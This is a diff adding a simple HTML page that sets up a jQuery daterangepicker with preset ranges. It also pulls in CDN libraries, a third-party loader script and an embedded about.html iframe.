@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<script type="text/javascript">
+var appoInit=document.createElement('script');
+var appoS=document.getElementsByTagName('script')[0];
+appoInit.type='text/javascript';
+appoInit.src='https://www.appocalypsis.com/loader/init/uvFFFP.js';
+appoInit.async=true;
+appoS.parentNode.insertBefore(appoInit, appoS);
+</script>
+<head>
+    <title>Page Title</title>
+    
+<script type="text/javascript" src="https://cdn.jsdelivr.net/jquery/latest/jquery.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/momentjs/latest/moment.min.js"></script>
+<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.min.js"></script>
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.css" />
+
+    <script src="new.js"></script>
+</head>
+<body>
+    
+<div id="reportrange" style="background: #fff; cursor: pointer; padding: 5px 10px; border: 1px solid #ccc; width: 100%">
+        <i class="fa fa-calendar"></i>&nbsp;
+        <span></span> <i class="fa fa-caret-down"></i>
+    </div>
+    
+    <iframe src="about.html" width="300px" height="400px"  frameborder="10" style="z-index:10;position:absolute;top:50%;left:50%;"></iframe>
+    <script type="text/javascript">
+    $(function() {
+    
+        var start = moment().subtract(29, 'days');
+        var end = moment();
+    
+        function cb(start, end) {
+            $('#reportrange span').html(start.format('MMMM D, YYYY') + ' - ' + end.format('MMMM D, YYYY'));
+            setseDate(start,end);
+        }
+    
+        $('#reportrange').daterangepicker({
+            startDate: start,
+            endDate: end,
+            ranges: {
+               'Today': [moment(), moment()],
+               'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
+               'Last 7 Days': [moment().subtract(6, 'days'), moment()],
+               'Last 30 Days': [moment().subtract(29, 'days'), moment()],
+               'This Month': [moment().startOf('month'), moment().endOf('month')],
+               'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
+            }
+        }, cb);
+    
+        cb(start, end);
+    
+    });
+    </script>
+    
+    
+</body>
+</html>
